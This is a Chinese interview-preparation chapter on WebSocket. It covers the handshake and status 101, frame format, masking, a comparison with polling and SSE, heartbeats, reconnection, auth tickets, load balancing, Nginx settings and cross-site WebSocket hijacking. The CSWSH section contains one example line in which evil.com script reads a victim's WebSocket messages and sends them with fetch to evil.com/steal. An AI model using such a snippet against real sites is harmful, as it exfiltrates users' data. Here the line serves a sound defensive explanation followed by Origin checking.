# 网络 · 11 WebSocket 与实时通信（题 33、70）

> 本册覆盖：WebSocket 是什么、怎么应用（原题 33）、状态码 101（原题 70）
> 题单只写了「同 HTML 文档第 23 题」和「101 是协议切换」。
> 本册把「握手 → 帧协议 → 四种实时方案对比 → 工程实践（心跳/重连/鉴权）→ 安全（CSWSH）」一次讲清。
> **这部分最容易被问成「你做过实时功能吗」——所以工程实践那节比协议细节更重要。**

---

## 11.1 一句话结论

WebSocket 是**在单个 TCP 连接上的全双工协议**，通过一次 **HTTP Upgrade 握手（返回 101）**从 HTTP 升级而来，之后双方可以**任意方向、任意时刻**发消息。
它解决了 HTTP「只能客户端主动请求」的根本限制，代价是**要自己处理心跳、重连、鉴权、负载均衡**。

---

## 11.2 握手：从 HTTP 升级到 WebSocket

### 11.2.1 完整握手

```http
① 客户端发起（这是一个标准的 HTTP/1.1 请求）
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket                    ← 我要升级协议
Connection: Upgrade                   ← 配合 Upgrade 使用
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==      ← 16 字节随机数的 base64
Sec-WebSocket-Version: 13             ← 协议版本（13 是目前的唯一版本）
Origin: https://example.com           ← 浏览器自动带（服务端应校验）
```

```http
② 服务端同意（101 Switching Protocols）
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=   ← 校验值
```

```http
③ 之后这个 TCP 连接不再说 HTTP，改说 WebSocket 帧
```

### 11.2.2 `Sec-WebSocket-Accept` 怎么算

```
Sec-WebSocket-Accept = base64( SHA1( Sec-WebSocket-Key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11" ) )
                                                                 ↑
                                                    这是一个固定的「魔法字符串」（RFC 6455 规定）
```

**手算验证**（RFC 里的例子）：

```
Key    = "dGhlIHNhbXBsZSBub25jZQ=="
拼接后  = "dGhlIHNhbXBsZSBub25jZQ==258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
SHA1   = 0xb3 7a 4f 2c c0 62 4f 16 90 f6 46 06 cf 38 59 45 b2 be c4 ea
base64 = "s3pPLMBiTxaQ9kYGzzhZRbK+xOo="
```

**服务端实现（Node.js）**：

```js
const crypto = require('node:crypto');
const GUID = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11';

function acceptKey(clientKey) {
  return crypto.createHash('sha1').update(clientKey + GUID).digest('base64');
}
```

### 11.2.3 为什么要这个「魔法字符串」（高频追问）

**不是为了加密，也不是为了认证**。三个目的：

| 目的 | 说明 |
|---|---|
| **① 防止普通 HTTP 服务器误判** | 一个只知道「回显请求头」的普通服务器（比如某些代理）不会算出正确的 `Accept`，于是握手失败，不会把连接误当成 WebSocket |
| **② 防止缓存污染** | 让响应不可预测，避免中间缓存把 101 响应缓存下来复用 |
| **③ 确认对方真的理解 WebSocket 协议** | 只有实现了 RFC 6455 的服务器才能算出正确的值 |

> **注意**：`Sec-WebSocket-Key` **不是认证凭据**，它只是随机数。**任何人都能算 Accept**，所以它**不提供任何安全性**。真正的安全靠 **TLS（wss://）+ 服务端校验 Origin + 应用层鉴权**。

### 11.2.4 握手失败会怎样

| 情况 | 结果 |
|---|---|
| 服务端不支持 WebSocket | 返回普通 HTTP 响应（比如 200）→ 客户端报 `Error during WebSocket handshake` |
| 服务端拒绝（比如鉴权失败） | 可以返回 401/403（**但浏览器只报握手失败，拿不到状态码**） |
| 代理不支持 Upgrade | 连接被断开，或返回 400 |
| 服务端没校验 Origin | 握手成功（**这就是 CSWSH 漏洞**） |

**⚠️ 一个实际痛点**：WebSocket 握手失败时，**浏览器出于安全考虑不把 HTTP 状态码暴露给 JS**（`onerror` 只给一个 `Event`）。所以**排查握手失败只能看 Network 面板或服务端日志**——这是开发 WebSocket 时最烦的事之一。

---

## 11.3 帧协议：为什么 WebSocket 没有「粘包」

### 11.3.1 帧格式

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-------+-+-------------+-------------------------------+
|F|R|R|R| opcode|M| Payload len |    Extended payload length    |
|I|S|S|S|  (4)  |A|     (7)     |         (16/64 bits)          |
|N|V|V|V|       |S|             |  (if len == 126 or 127)       |
| |1|2|3|       |K|             |                               |
+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
|     Extended payload length continued (if len == 127)         |
+ - - - - - - - - - - - - - - - +-------------------------------+
|                               |  Masking-key (if MASK set)    |
+-------------------------------+-------------------------------+
|                         Payload Data ...                      |
+---------------------------------------------------------------+
```

**四个关键字段**：

| 字段 | 作用 |
|---|---|
| **FIN**（1 位） | 是否是消息的最后一帧（支持**分片**） |
| **opcode**（4 位） | 帧类型（见下表） |
| **MASK**（1 位） | 客户端发出的帧**必须为 1**（加掩码） |
| **Payload len**（7/7+16/7+64 位） | **数据长度** ← **这就是「没有粘包」的根本原因** |

**opcode 表**：

| 值 | 类型 | 说明 |
|---|---|---|
| `0x0` | Continuation | 分片的后续帧 |
| `0x1` | **Text** | UTF-8 文本 |
| `0x2` | **Binary** | 二进制 |
| `0x8` | **Close** | 关闭连接（可带关闭码） |
| `0x9` | **Ping** | 心跳 |
| `0xA` | **Pong** | 心跳响应 |

### 11.3.2 为什么没有粘包

**因为每一帧都有明确的 `Payload len`**。

```
TCP 字节流：[帧头1][数据1][帧头2][数据2][帧头3]...
                ↓
接收方按帧头里的长度字段精确切分
                ↓
每个帧独立，天然有边界
```

**对比 TCP 上的自定义协议**：如果不用长度前缀，就没法知道「数据到哪结束」，所以有「粘包」（详见 04 册 4.5）。

**WebSocket 已经帮你做了这件事**：协议层自带长度字段 + FIN 标志（支持消息分片），所以**应用层拿到的每一条 `message` 事件就是一条完整消息**。

> **面试话术**：「WebSocket 没有粘包问题，因为它有自己的帧协议——每帧头部有 7/16/64 位的 payload 长度字段，还有 FIN 标志表示消息是否结束。所以应用层收到的每一条 message 就是一个完整消息。而裸 TCP 是纯字节流，没有长度信息，所以要应用层自己做长度前缀。」

### 11.3.3 为什么要 MASK（掩码）

**规范要求：客户端发出的所有帧必须加掩码（`MASK=1`），服务端发出的帧不能加。**

**掩码算法**：

```js
// 4 字节随机掩码，循环 XOR
function mask(payload, maskKey) {
  const out = Buffer.allocUnsafe(payload.length);
  for (let i = 0; i < payload.length; i++) {
    out[i] = payload[i] ^ maskKey[i % 4];
  }
  return out;
}
```

**为什么要掩码**（RFC 6455 给的官方理由）：

历史上曾有**缓存投毒攻击**：攻击者控制一个网页，让它向某个代理服务器发起「看起来像 HTTP 请求」的 TCP 流量。如果代理缓存了这个「响应」，后续正常用户访问时就会拿到攻击者构造的内容。

WebSocket 让客户端能发任意字节，如果不加掩码，恶意客户端就能构造出「看起来像 HTTP 请求」的 WebSocket 帧。**加掩码后，帧内容被随机化，攻击者无法构造出可预测的字节序列**。

> 这个细节答出来很加分，但面试很少问到。

---

## 11.4 四种实时方案对比（这道题的真正考点）

### 11.4.1 总表

| 方案 | 方向 | 实时性 | 连接数 | 协议 | 自动重连 | 二进制 | 适用 |
|---|---|---|---|---|---|---|---|
| **短轮询（Polling）** | 客户端拉 | 差（取决于间隔） | 每次新建 | HTTP | — | ✅ | 极简场景、兼容性优先 |
| **长轮询（Long Polling）** | 客户端拉（挂起） | 较好 | 每次占用一个 | HTTP | 需自己实现 | ✅ | 兼容老浏览器、消息频率低 |
| **SSE（EventSource）** | **服务端推**（单向） | 好 | 1 个 | HTTP | ✅ **内置** | ❌ 只文本 | 通知、进度、日志流 |
| **WebSocket** | **双向** | **最好** | 1 个 | WS（Upgrade） | ❌ 需自己实现 | ✅ | 聊天、协作、游戏、行情 |

### 11.4.2 短轮询

```js
setInterval(async () => {
  const res = await fetch('/api/messages');
  const list = await res.json();
  render(list);
}, 3000);
```

**问题**：
- **实时性差**：最多延迟一个间隔
- **大量无效请求**：没数据也发
- **服务端压力大**：QPS = 用户数 / 间隔

**唯一优点**：实现最简单，兼容性最好，**穿过任何代理和防火墙**。

### 11.4.3 长轮询

```js
async function longPoll() {
  while (true) {
    try {
      const res = await fetch('/api/messages?timeout=30');
      const data = await res.json();
      if (data.length) render(data);
    } catch (e) {
      await sleep(1000);
    }
  }
}
```

**服务端**：请求到达后**不立即返回**，挂起（比如 30 秒），有数据就返回，超时返回空。

**优点**：实时性好（有数据立即返回），兼容性好（纯 HTTP）。
**缺点**：
- **每个客户端占一个连接**（服务端连接数 = 在线用户数，且是「挂起」的）
- 每次返回后要重新发请求（一次数据 = 两次请求）
- 代理/网关的超时配置要调（`proxy_read_timeout`）

### 11.4.4 SSE（Server-Sent Events）

**很多人不知道这个方案，但它非常适合「只需要服务端推」的场景。**

```js
const es = new EventSource('/api/stream');

es.onmessage = (e) => console.log(e.data);
es.addEventListener('custom', (e) => console.log(e.data));
es.onerror = () => { /* 浏览器会自动重连 */ };
```

**服务端响应格式**：

```http
HTTP/1.1 200 OK
Content-Type: text/event-stream
Cache-Control: no-cache
Connection: keep-alive

data: 第一条消息\n
\n
event: progress\n
id: 1\n
data: {"percent": 50}\n
\n
retry: 3000\n
data: 断线后 3 秒重连\n
\n
```

| 字段 | 作用 |
|---|---|
| `data:` | 消息内容（多行就写多个 `data:`） |
| `event:` | 事件名（对应 `addEventListener`） |
| `id:` | 消息 ID，断线重连时浏览器会带 `Last-Event-ID` 头 |
| `retry:` | 重连间隔（毫秒） |

**SSE 的四个优势**（相比 WebSocket）：

| 优势 | 说明 |
|---|---|
| **自动重连** | 浏览器内置，还能带 `Last-Event-ID` **断点续传** |
| **纯 HTTP** | 不用 Upgrade，穿过所有代理和防火墙 |
| **实现简单** | 服务端就是一个不结束的 `text/event-stream` 响应 |
| **HTTP/2 友好** | 在 HTTP/2 下可以多路复用，不受「同域 6 连接」限制 |

**SSE 的三个限制**：

| 限制 | 说明 |
|---|---|
| **单向** | 只能服务端 → 客户端。客户端要发消息得另外发 HTTP 请求 |
| **只支持文本** | 二进制要 base64（有 33% 开销） |
| **老浏览器不支持** | IE 完全不支持（但可以用 polyfill） |

**典型适用**：ChatGPT 的打字机效果（就是 SSE）、构建进度、股票行情（只读）、日志流、通知。

> **面试时如果被问「除了 WebSocket 还有什么实时方案」，答 SSE 并说清「ChatGPT 的打字机效果就是 SSE」——这个例子非常有说服力。**

### 11.4.5 四者怎么选

```
需要「客户端频繁发消息」吗？
├─ 需要（聊天、协作编辑、游戏）→ WebSocket
└─ 不需要（只需要服务端推）
     ├─ 消息频率很低（分钟级）→ 短轮询（最省事）
     ├─ 要兼容极老浏览器 → 长轮询
     └─ 现代浏览器 → SSE（自动重连 + 断点续传，比 WebSocket 简单）
```

---

## 11.5 工程实践（比协议细节更重要）

**面试官问「你做过实时功能吗」，就是在等这一节。**

### 11.5.1 心跳：为什么必须有

**问题**：中间的 NAT、代理、负载均衡会在「连接空闲一段时间」后**静默断开**，而两端都不知道。

| 中间设备 | 典型空闲超时 |
|---|---|
| Nginx `proxy_read_timeout` | **默认 60 秒** |
| 云厂商 SLB / ALB | 60~900 秒 |
| 家用路由器 NAT | 几分钟到几十分钟 |
| 移动网络（4G/5G） | 可能很快（基站切换） |

**断了但双方都不知道** = 消息发出去石沉大海，用户以为连着。

**解法：应用层心跳**

```js
// 客户端
const HEARTBEAT_INTERVAL = 30000;
let heartbeatTimer;

function startHeartbeat(ws) {
  clearInterval(heartbeatTimer);
  heartbeatTimer = setInterval(() => {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'ping', ts: Date.now() }));
    }
  }, HEARTBEAT_INTERVAL);
}
```

```js
// 服务端：收到 ping 回 pong，同时检测「多久没收到消息」
const ALIVE_TIMEOUT = 90000;   // 3 个心跳周期
ws.isAlive = true;
ws.on('pong', () => { ws.isAlive = true; });

const timer = setInterval(() => {
  ws.clients.forEach((client) => {
    if (!client.isAlive) return client.terminate();   // 上一轮没回，直接断
    client.isAlive = false;
    client.ping();                                    // 协议层 ping（opcode 0x9）
  });
}, 30000);
```

**两种心跳**：

| 层级 | 方式 | 优点 | 缺点 |
|---|---|---|---|
| **协议层** | `ping` / `pong` 帧（opcode 0x9 / 0xA） | 标准、开销小（2 字节） | 浏览器 JS **不能主动发 ping**（只能由服务端发，浏览器自动回 pong） |
| **应用层** | 自己发 `{"type":"ping"}` | 浏览器可控、可以带业务信息（如在线状态） | 开销略大 |

**⚠️ 关键限制**：**浏览器 JS 没有 API 主动发协议层 ping 帧**。所以：
- 如果服务端发 ping，浏览器会**自动回 pong**（这个不用你写）
- 如果想让客户端主动探测，只能用**应用层心跳**

**心跳间隔怎么定**：**小于中间设备的最小超时**。Nginx 默认 60 秒，所以心跳设 **30 秒**比较安全（留一半余量）。

### 11.5.2 重连：指数退避 + 抖动

```js
class ReconnectingWS {
  constructor(url) {
    this.url = url;
    this.retry = 0;
    this.maxRetry = 10;
    this.connect();
  }

  connect() {
    this.ws = new WebSocket(this.url);

    this.ws.onopen = () => {
      this.retry = 0;                    // 成功就重置
      this.startHeartbeat();
    };

    this.ws.onclose = () => {
      this.stopHeartbeat();
      this.scheduleReconnect();
    };

    this.ws.onerror = () => this.ws.close();
  }

  scheduleReconnect() {
    if (this.retry >= this.maxRetry) return;

    // 指数退避 + 随机抖动（防止惊群）
    const base = Math.min(30000, 1000 * 2 ** this.retry);
    const jitter = Math.random() * 1000;
    const delay = base + jitter;

    this.retry++;
    setTimeout(() => this.connect(), delay);
  }
}
```

**为什么必须加抖动（jitter）**：

```
服务端重启，10 万个客户端同时断线
    ↓ 没有抖动
10 万个客户端在同一毫秒重连 → 服务端瞬间被打爆 → 又挂 → 循环
    ↓ 有抖动
重连时间被分散到几秒内 → 服务端平滑恢复
```

**这就是「惊群效应（thundering herd）」**，加随机抖动是标准解法。

### 11.5.3 鉴权：握手时怎么带 token

**WebSocket 的 JS API 不支持自定义请求头**（只能 `new WebSocket(url, protocols)`）。所以有四种做法：

| 方式 | 做法 | 优点 | 缺点 |
|---|---|---|---|
| **① Query 参数** | `wss://api.com/ws?token=xxx` | 最简单 | **token 会进 Nginx access log、浏览器历史** ⚠️ |
| **② 子协议（protocols）** | `new WebSocket(url, ['bearer', token])` | 不进 URL | 语义滥用、长度受限 |
| **③ Cookie** | 依赖同站 cookie 自动带 | 无需改代码 | **跨站需要 `SameSite=None`；且会带来 CSWSH 风险** |
| **④ 先 HTTP 换 ticket** | 先 `POST /ws-ticket` 拿一次性 ticket，再 `wss://...?ticket=xxx` | **最安全**（一次性、短有效期、不进长期日志） | 多一次请求 |

**推荐方案 ④**：

```js
// ① 先用普通 HTTP（能带 Authorization 头）换一个一次性 ticket
const { ticket } = await fetch('/api/ws-ticket', {
  method: 'POST',
  headers: { Authorization: `Bearer ${accessToken}` },
}).then((r) => r.json());

// ② 用 ticket 建 WS（ticket 一次性、30 秒有效）
const ws = new WebSocket(`wss://api.com/ws?ticket=${ticket}`);
```

**为什么不能只在握手时校验一次就完事**：

因为 **WebSocket 连接可能活几小时**。如果 token 15 分钟过期，连接不会自动断。所以还需要：

```js
// 服务端定时检查连接绑定的 token 是否还有效
setInterval(() => {
  for (const [ws, meta] of connections) {
    if (Date.now() > meta.tokenExpireAt) {
      ws.close(4001, 'token expired');    // 自定义关闭码
    }
  }
}, 60000);
```

### 11.5.4 负载均衡：WebSocket 的部署难题

**问题**：WebSocket 是**有状态的长连接**，而 HTTP 是无状态的。

```
用户 A 连到 server-1，用户 B 连到 server-2
    ↓
A 给 B 发消息
    ↓
server-1 没有 B 的连接 → 消息发不出去
```

**三种解法**：

| 方案 | 说明 | 适用 |
|---|---|---|
| **① 粘性会话（sticky session）** | 同一用户的请求都路由到同一台机器（按 IP 或 cookie hash） | 小规模；扩容时会有连接迁移问题 |
| **② 共享存储（Redis Pub/Sub）** | 所有节点订阅同一个频道，消息广播给所有节点，各节点推给自己连接的用户 | **主流方案** |
| **③ 专门的消息网关** | 用 Socket.IO Redis Adapter、Centrifugo、EMQX 等 | 大规模 |

```js
// Redis Pub/Sub 方案示意
const pub = redis.duplicate();
const sub = redis.duplicate();

sub.subscribe('ws:broadcast');
sub.on('message', (channel, msg) => {
  const { userId, payload } = JSON.parse(msg);
  const ws = connections.get(userId);
  if (ws) ws.send(payload);          // 只有持有该用户连接的节点会真的发出去
});

// 任意节点要发给某个用户
pub.publish('ws:broadcast', JSON.stringify({ userId, payload }));
```

**还有一个部署细节**：**Nginx 必须配 `proxy_http_version 1.1` 和 `Upgrade` 头**，否则 WebSocket 握手过不去。

```nginx
location /ws {
    proxy_pass http://backend;
    proxy_http_version 1.1;                          # ★ 必须是 1.1
    proxy_set_header Upgrade $http_upgrade;          # ★
    proxy_set_header Connection "upgrade";           # ★
    proxy_set_header Host $host;
    proxy_read_timeout 3600s;                        # 长连接，别 60 秒就断
    proxy_send_timeout 3600s;
}
```

**`proxy_read_timeout` 默认 60 秒** —— 如果不改，**WebSocket 连接会在 60 秒后被 Nginx 断开**。这是最常见的「WebSocket 老是断」的原因之一。

### 11.5.5 断线重连后的消息补偿

**问题**：断线期间服务器发的消息会丢。重连后要补。

**方案**：消息带**单调递增的序号**，客户端记录最后收到的 seq，重连时带上：

```js
// 客户端重连
const ws = new WebSocket(`wss://api.com/ws?lastSeq=${lastSeq}`);

// 服务端：从 lastSeq 之后开始补发
ws.on('connection', (socket, req) => {
  const lastSeq = Number(new URL(req.url, 'http://x').searchParams.get('lastSeq') || 0);
  const missed = await db.messages.find({ seq: { $gt: lastSeq } }).limit(1000);
  missed.forEach((m) => socket.send(JSON.stringify(m)));
});
```

**如果缺太多**（比如离线一小时），就别补了，直接让客户端**拉一次全量快照**。

> 这个设计思路叫「**快照 + 增量**」，和 Git、数据库复制、CRDT 都是一脉相承的。

---

## 11.6 安全：CSWSH（跨站 WebSocket 劫持）

### 11.6.1 攻击原理

**WebSocket 握手不受同源策略限制，而且会带 Cookie。**

```
① 用户登录了 bank.com，浏览器有 bank.com 的 cookie
② 用户访问了 evil.com
③ evil.com 的 JS 执行：
     const ws = new WebSocket('wss://bank.com/ws');
     ws.onmessage = (e) => fetch('https://evil.com/steal?data=' + e.data);
④ 浏览器发起握手，【带上了 bank.com 的 cookie】
⑤ bank.com 服务端看到 cookie 有效 → 握手成功
⑥ ★ 关键：evil.com 的 JS 能【读】WebSocket 的消息！
```

**这就是 CSWSH（Cross-Site WebSocket Hijacking）**。

**和 CSRF 的区别**：

| | CSRF | CSWSH |
|---|---|---|
| 能否读响应 | ❌ 不能 | ✅ **能**（WebSocket 没有同源限制） |
| 危害 | 请求被执行（转账、改密码） | **数据泄露 + 操作执行**（更严重） |

### 11.6.2 防御

**唯一有效的防御：服务端校验 `Origin` 头。**

```js
const ALLOWED_ORIGINS = new Set([
  'https://bank.com',
  'https://www.bank.com',
]);

wss.on('connection', (ws, req) => {
  const origin = req.headers.origin;

  // ★ 必须校验！Origin 缺失也要拒绝（非浏览器客户端可能没有）
  if (!origin || !ALLOWED_ORIGINS.has(origin)) {
    ws.close(1008, 'origin not allowed');
    return;
  }
  // ...
});
```

**注意三个点**：

1. **`Origin` 是浏览器控制的，JS 改不了**，所以可信。
2. **`Origin` 缺失时要拒绝**（有些非浏览器客户端不带，但你不应该允许）。
3. **不要只靠 Cookie 鉴权**——Cookie 会自动带，等于把身份送给了攻击者。**要额外用 token（放在 URL 的 ticket 或子协议里）**。

> **面试话术**：「WebSocket 有个容易被忽略的安全问题叫 CSWSH——握手不受同源策略限制，而且会带 Cookie，所以攻击者页面能连上你的 WebSocket 并**读取消息**（比 CSRF 更严重，CSRF 读不到响应）。防御手段是服务端必须校验 `Origin` 头，并且不要只靠 Cookie 鉴权，要用额外的 token。」

---

## 11.7 常见坑

| 坑 | 正确说法 |
|---|---|
| 说「WebSocket 是基于 HTTP 的」 | 只在**握手**时借用了 HTTP，之后是**独立的 TCP 上的帧协议** |
| 说「`Sec-WebSocket-Key` 是认证用的」 | 不是，只是随机数，**提供零安全性** |
| 说「WebSocket 有粘包」 | 没有，帧头有 payload 长度和 FIN 标志 |
| 说「WebSocket 不受同源策略限制所以很安全」 | 恰恰相反，**这是安全隐患**（CSWSH） |
| 忘了配 `proxy_read_timeout` | Nginx 默认 60 秒断开，表现为「WebSocket 老断」 |
| 忘了 `proxy_http_version 1.1` | 握手直接失败 |
| 心跳设 60 秒以上 | 中间设备可能已经断了，心跳没意义 |
| 重连不加抖动 | 服务端重启时惊群 |
| 只在握手时校验 token | 连接活几小时，token 过期了也不会断 |
| 用 query 传长期 token | 会进 Nginx 日志和浏览器历史，应用一次性 ticket |
| 用 `ws.send` 不判断 `readyState` | 连接未打开时会抛错或丢消息 |
| 以为 SSE 需要 WebSocket | SSE 是纯 HTTP，更简单，还自带重连 |
| 单机部署不考虑负载均衡 | 多节点时必须用 Redis Pub/Sub 或粘性会话 |

**一个补充：`readyState` 的四个值**

| 值 | 常量 | 含义 |
|---|---|---|
| 0 | `CONNECTING` | 连接中 |
| 1 | `OPEN` | 已连接，可发消息 |
| 2 | `CLOSING` | 关闭中 |
| 3 | `CLOSED` | 已关闭 |

```js
function safeSend(ws, data) {
  if (ws.readyState !== WebSocket.OPEN) {
    // 别丢掉：放进待发队列，重连后统一发
    pendingQueue.push(data);
    return false;
  }
  ws.send(data);
  return true;
}
```

---

## 11.8 答题模板

### 30 秒版

> WebSocket 是在单个 TCP 连接上的全双工协议。它通过一次 HTTP Upgrade 握手从 HTTP 升级上来，服务端返回 **101 Switching Protocols**，之后就改用 WebSocket 的帧协议通信，双方可以任意方向、任意时刻发消息。
> 它解决了 HTTP「只能客户端主动请求」的限制，适合聊天、协作、行情这类双向高频场景。
> 代价是要自己处理心跳、重连、鉴权和负载均衡。

### 2 分钟版（完整版）

> 我分四块讲：握手、帧协议、方案对比、工程实践。
>
> **第一，握手**。客户端发一个标准 HTTP 请求，带 `Upgrade: websocket`、`Connection: Upgrade`、`Sec-WebSocket-Key` 和一个版本号 13。服务端如果同意，返回 **101**，并带 `Sec-WebSocket-Accept`，它的值是 `base64(sha1(key + 固定GUID))`。这个魔法 GUID 不是为了加密，主要是防止普通 HTTP 服务器误判、以及防止缓存污染。**`Sec-WebSocket-Key` 本身不提供任何安全性**，安全靠 wss + Origin 校验 + 应用层鉴权。
>
> **第二，帧协议**。每个帧有 FIN 标志（表示消息是否结束，支持分片）、opcode（text/binary/close/ping/pong）、payload 长度字段（7/16/64 位）。**这就是 WebSocket 没有粘包的原因**——有明确长度，天然有边界，应用层收到的每一条 message 就是完整消息。另外客户端发的帧必须加掩码，是为了防止历史上的代理缓存投毒攻击。
>
> **第三，方案对比**。短轮询实时性差、无效请求多；长轮询实时性好但每客户端占一个挂起连接；**SSE 是纯 HTTP 的单向推送，自带自动重连和 `Last-Event-ID` 断点续传，ChatGPT 的打字机效果就是 SSE**；WebSocket 是双向、实时性最好，但要自己做重连。选型上，只需要服务端推就用 SSE，需要双向频繁通信才上 WebSocket。
>
> **第四，工程实践**，这部分是实际做过的分水岭。**心跳必须有**，因为 Nginx 默认 60 秒、云 SLB 也有空闲超时，连接会被静默断开而两端不知道，所以心跳设 30 秒留余量。注意浏览器 JS **不能主动发协议层 ping**，只能由服务端发、浏览器自动回 pong，想主动探测只能用应用层心跳。**重连要指数退避加随机抖动**，否则服务端重启时十万客户端同时重连会惊群。**鉴权**建议先用 HTTP 换一个一次性 ticket，再用 ticket 建连——直接放 query 里的长期 token 会进 Nginx 日志和浏览器历史。另外连接可能活几小时，所以服务端要定时检查 token 是否过期。**负载均衡**是有状态连接的难题，主流方案是 Redis Pub/Sub 广播给所有节点。最后 Nginx 必须配 `proxy_http_version 1.1` + `Upgrade` 头 + 调大 `proxy_read_timeout`，默认 60 秒会断。
>
> 最后补一个安全问题：**WebSocket 握手不受同源策略限制，而且会带 Cookie**，所以有 CSWSH——攻击者页面能连上你的 WebSocket 并且**能读消息**，比 CSRF 更严重。防御是服务端必须校验 Origin，并且不要只靠 Cookie 鉴权。

### 追问表

| 追问 | 回答要点 |
|---|---|
| 101 是什么 | Switching Protocols，WebSocket 握手成功 |
| `Sec-WebSocket-Key` 有什么用 | 只是随机数，配合 GUID 算 Accept，**不提供安全性** |
| 为什么要那个魔法 GUID | 防普通服务器误判 + 防缓存污染 + 确认对方实现了协议 |
| WebSocket 有粘包吗 | 没有，帧头有 payload 长度 + FIN |
| 为什么客户端帧要加掩码 | 防代理缓存投毒（历史攻击） |
| WebSocket 受同源限制吗 | **不受**，所以有 CSWSH 风险 |
| 怎么防 CSWSH | 服务端校验 `Origin` + 不只靠 Cookie 鉴权 |
| 为什么要心跳 | Nginx 60 秒、SLB 有超时，会静默断开 |
| 浏览器能发 ping 帧吗 | 不能，只有服务端能发，浏览器自动回 pong |
| 重连为什么要抖动 | 防惊群（服务端重启时同时重连） |
| 鉴权怎么带 token | HTTP 换一次性 ticket 最安全；query 会进日志 |
| 多节点怎么部署 | Redis Pub/Sub 广播，或粘性会话 |
| Nginx 怎么配 | `proxy_http_version 1.1` + `Upgrade` + 调大 `read_timeout` |
| SSE 和 WebSocket 区别 | SSE 单向、纯 HTTP、自带重连、只文本 |
| 断线消息怎么补 | 消息带 seq，重连带 lastSeq 补发；缺太多就拉快照 |
| 为什么 WebSocket 握手失败看不到错误码 | 浏览器安全考虑，只给 onerror 一个 Event |

---

## 11.9 速记卡

```
握手
  GET + Upgrade: websocket + Connection: Upgrade + Sec-WebSocket-Key + Version: 13
  ← 101 Switching Protocols + Sec-WebSocket-Accept
  Accept = base64(sha1(Key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))
  Key 不是认证凭据，零安全性；GUID 是防误判 + 防缓存污染

帧
  FIN（分片）+ opcode（1=text 2=binary 8=close 9=ping A=pong）+ 长度字段
  ★ 有长度字段 → 没有粘包
  客户端帧必须加掩码 → 防代理缓存投毒

四种方案
  短轮询：简单，实时性差，无效请求多
  长轮询：实时性好，每客户端占一个挂起连接
  SSE：纯 HTTP 单向、自带重连 + Last-Event-ID、只文本（ChatGPT 打字机）
  WebSocket：双向、最好、要自己做重连

工程实践（重点）
  心跳 30s（Nginx 默认 60s 会断）；浏览器不能主动发 ping 帧
  重连：指数退避 + 随机抖动（防惊群）
  鉴权：HTTP 换一次性 ticket（query 里的长期 token 会进日志）
  连接长活 → 服务端定时校验 token 过期
  负载均衡：Redis Pub/Sub 广播（有状态连接）
  Nginx：proxy_http_version 1.1 + Upgrade + proxy_read_timeout 3600s
  断线补偿：seq + lastSeq 补发；缺太多拉快照

安全
  CSWSH：握手不受 SOP 限制 + 会带 Cookie → 攻击者能【读】消息
  防御：校验 Origin + 不只靠 Cookie 鉴权
```
